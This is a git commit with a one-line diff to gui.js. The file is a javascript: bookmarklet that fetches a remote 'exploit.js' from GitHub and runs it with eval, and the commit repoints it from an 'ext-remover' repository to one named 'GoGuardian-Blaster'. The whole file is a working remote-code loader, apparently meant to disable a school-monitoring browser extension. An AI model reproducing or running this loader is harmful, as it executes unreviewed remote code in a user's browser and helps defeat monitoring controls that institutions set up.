0859327d81aa6f3bc2d575b29ad99a3b6ee3aef6
vsdavefan100 <122555951+vsdavefan100@users.noreply.github.com>
2023-01-24 09:44:53 -0500

    Update gui.js

--- gui.js
+++ gui.js
@@ -1,1 +1,1 @@
-javascript:fetch(`https://raw.githubusercontent.com/rice-a-rona/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+javascript:fetch(`https://raw.githubusercontent.com/vsdavefan100/GoGuardian-Blaster/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
